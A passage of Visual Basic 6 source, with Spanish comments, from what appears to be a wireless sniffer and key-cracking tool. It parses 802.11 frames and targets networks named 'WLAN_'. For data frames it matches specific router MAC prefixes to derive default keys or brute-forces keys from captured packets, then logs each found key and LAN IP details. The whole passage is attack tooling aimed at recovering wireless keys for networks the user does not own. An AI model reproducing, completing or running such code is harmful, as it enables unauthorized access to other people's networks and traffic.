         ElseIf frmctr.ToDS = False And frmctr.FromDS = True Then
            pckdMAC = Mid$(PLD, 5, 6)
            pckBSSID = Mid$(PLD, 11, 6)
            pcksMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = False Then
            pckBSSID = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckdMAC = Mid$(PLD, 17, 6)
         ElseIf frmctr.ToDS = True And frmctr.FromDS = True Then 'No sabemos como asignar, asi que dejamos como caso primero
            pckdMAC = Mid$(PLD, 5, 6)
            pcksMAC = Mid$(PLD, 11, 6)
            pckBSSID = Mid$(PLD, 17, 6)
         End If
         bssid = MAC(pckBSSID)
         smac = MAC(pcksMAC)
         dmac = MAC(pckdMAC)
         ESSID = BSSID_a_ESSID(bssid)
         
         Select Case frmctr.Type
                Case PCK_TYPE.Management
                     If frmctr.Subtype <> PCK_SUBTYPE.mgmt_Beacon Then
                        ESSID = BSSID_a_ESSID(bssid)
                        If ESSID = "" Then Exit Sub
                     End If
                     Select Case frmctr.Subtype
                            Case PCK_SUBTYPE.mgmt_Beacon         'BALIZA
                                 ESSID = Mid$(PLD, 39, Asc(Mid$(PLD, 38, 1)))
                                 bssid = MAC(Mid$(PLD, 11, 6))
                                 l_beacons.Caption = Val(l_beacons.Caption) + 1
                                 l_beacons.Refresh
                                 If Left$(ESSID, 5) = "WLAN_" Then ProcesaBeacon ESSID, bssid

                            Case PCK_SUBTYPE.mgmt_AssocResponse  'ASOCIACION

                                    If ch_mngt = 1 Then Log "<-- Asociacion" & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_Authentication 'CHALLENGE
                                 If Asc(Mid$(PLD, 27, 1)) = 2 Then

                                    If ch_mngt = 1 Then Log "<-- Autenticacion" & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                                 End If
                            
                            Case PCK_SUBTYPE.mgmt_AssocRequest
                                    If ch_mngt = 1 Then Log "<-- mgmt_AssocRequest: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_ATIM
                                    If ch_mngt = 1 Then Log "<-- mgmt_ATIM: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_Deauthentication
                                    If ch_mngt = 1 Then Log "<-- mgmt_Deauthentication: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_Disassociation
                                    If ch_mngt = 1 Then Log "<-- mgmt_Disassociation: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_ProbeRequest
                                    If ch_mngt = 1 Then Log "<-- mgmt_ProbeRequest: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID
                            Case PCK_SUBTYPE.mgmt_ProbeResponse
                                    If ch_mngt = 1 Then Log "<-- mgmt_ProbeResponse: " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_ReAssocRequest
                                    If ch_mngt = 1 Then Log "<-- mgmt_ReAssocRequest: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                            Case PCK_SUBTYPE.mgmt_ReAssocResponse
                                    If ch_mngt = 1 Then Log "<-- mgmt_ReAssocResponse: " & ASCIIHexa2(pcksMAC) & " -> " & ESSID & " -> " & ASCIIHexa2(pckdMAC)
                     
                     End Select
                
                Case PCK_TYPE.data
                     If Not BSSID_WLAN(pckBSSID) Then Exit Sub
                     l_datos.Caption = Val(l_datos.Caption) + 1
                     l_datos.Refresh
                     If ch_noinv.Value = 1 And InStr(RelBSSIDs, "|" & bssid & "|") > 0 Then
                        Exit Sub
                     End If
                     Select Case frmctr.Subtype
                            Case PCK_SUBTYPE.data_NullData
                                 Log "<-- NullData: " & ESSID & " -> " & ASCIIHexa(pckdMAC)
                            Case PCK_SUBTYPE.data_Data
                                 'Log "<-- Data: " & ASCIIHexa(pcksMAC) & " -> " & essid & " -> " & ASCIIHexa(pckdMAC)
                                 nuevaclave = -1
                                 If ESSID > "" Then
                                    ib = IndiceBSSID(bssid)
                                    lst_datos.List(ib) = lst_datos.List(ib) + 1
                                    If Right$(ASCIIHexa(pckdMAC), 2) = Right$(ESSID, 2) And (Left$(ASCIIHexa(pckdMAC), 6) = "001349" Or Left$(ASCIIHexa(pckdMAC), 6) = "000138" Or Left$(ASCIIHexa(pckdMAC), 6) = "0030DA") Then
                                       nuevaclave = PonClave(bssid, dmac)
                                    ElseIf Right$(ASCIIHexa(pcksMAC), 2) = Right$(ESSID, 2) And (Left$(ASCIIHexa(pcksMAC), 6) = "001349" Or Left$(ASCIIHexa(pcksMAC), 6) = "000138" Or Left$(ASCIIHexa(pcksMAC), 6) = "0030DA") Then
                                       nuevaclave = PonClave(bssid, smac)
                                    ElseIf ch_brute.Value = 1 And dmac <> "FF:FF:FF:FF:FF:FF" Then
                                       If InStr(RelBSSIDs, "|" & bssid & "|") = 0 Then
                                          Log "Aplicando fuerza bruta a paquete de " & ESSID
                                          ws02.Close
                                          clavefb = GuessClave(Mid$(PLD, 25), clave2(bssid, ESSID))
                                       End If
                                    End If
                                    If nuevaclave > -1 Then
                                       If ClaveValida(Mid$(PLD, 25), sClave) Then
                                          EscribeClave bssid, sClave
                                          Log "(i) Clave encontrada para " & ESSID
                                          Log "(i) Info. LAN: " & IPs(Mid$(PLD, 25), sClave)
                                       Else
                                          lst_claves.List(nuevaclave) = "!"
                                       End If
                                    End If
                                    If clavefb <> "" Then
                                          EscribeClave bssid, sClave
                                          Log "(i) Clave encontrada por fuerza bruta para " & ESSID
                                          Log "(i) Info. LAN: " & IPs(Mid$(PLD, 25), sClave)
                                    End If
                                 End If
                            Case Else
                                 Log "<-- Datos subtype " & frmctr.Subtype
                     End Select
'                Case PCK_TYPE.Control
            
         End Select
       End Select
       If ws02.State <> 7 Then Debug.Print Conecta()
End Sub
Private Function BSSID_WLAN(ByVal bssid As String) As Boolean
    Dim n As Integer
    If InStr(bssid, ":") = 0 Then bssid = MAC(bssid)
    For n = 0 To lst_bssid.ListCount - 1
        If bssid = lst_bssid.List(n) Then
           BSSID_WLAN = True
           Exit Function
        End If
    Next n
End Function

Private Sub Log(ByVal msg As String)
  lst_paquetes.AddItem msg
  If lst_paquetes.ListCount > 11 Then
     lst_paquetes.TopIndex = lst_paquetes.ListCount - 11
  End If
  lst_paquetes.Refresh
End Sub

Private Sub ActuTramas()
   Dim cTtps As Long
   Dim cNtps As Long
   
   l_buffer = Val(l_buffer) + 1
   l_buffer.Refresh
   cNtps = Val(l_buffer)
   cTtps = GetTickCount()
   If (cTtps - Ttps) > 5000 Then
      l_tps.Caption = Int((cNtps - Ntps) / ((cTtps - Ttps) / 1000))
      Ttps = cTtps
      Ntps = cNtps
   End If
   l_tps.Refresh
End Sub
